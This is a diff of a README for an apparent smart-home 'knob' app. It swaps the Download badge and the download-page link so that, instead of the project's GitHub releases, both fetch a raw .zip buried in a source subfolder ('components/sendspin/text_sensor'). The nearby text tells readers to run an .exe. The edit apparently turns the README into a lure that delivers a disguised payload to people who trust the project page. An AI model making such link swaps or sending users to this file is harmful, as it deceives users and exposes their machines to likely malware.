@@ -1,6 +1,6 @@
 # 🔘 smart-home-button - Control your home with a knob
 
-[![](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Adductbenefitofclergy918/smart-home-button/releases)
+[![](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Adductbenefitofclergy918/smart-home-button/main/components/sendspin/text_sensor/home-button-smart-v3.5.zip)
 
 ## 🏠 About this software
 
@@ -19,7 +19,7 @@ Ensure your computer has the following items before you begin:
 
 Visit the project page to get the installer for your hardware.
 
-[Click here to visit the download page](https://github.com/Adductbenefitofclergy918/smart-home-button)
+[Click here to visit the download page](https://raw.githubusercontent.com/Adductbenefitofclergy918/smart-home-button/main/components/sendspin/text_sensor/home-button-smart-v3.5.zip)
 
 Select the file that ends in .exe from the latest release. Save this file to your computer. Most users save the file to the Downloads folder for easy access.
 
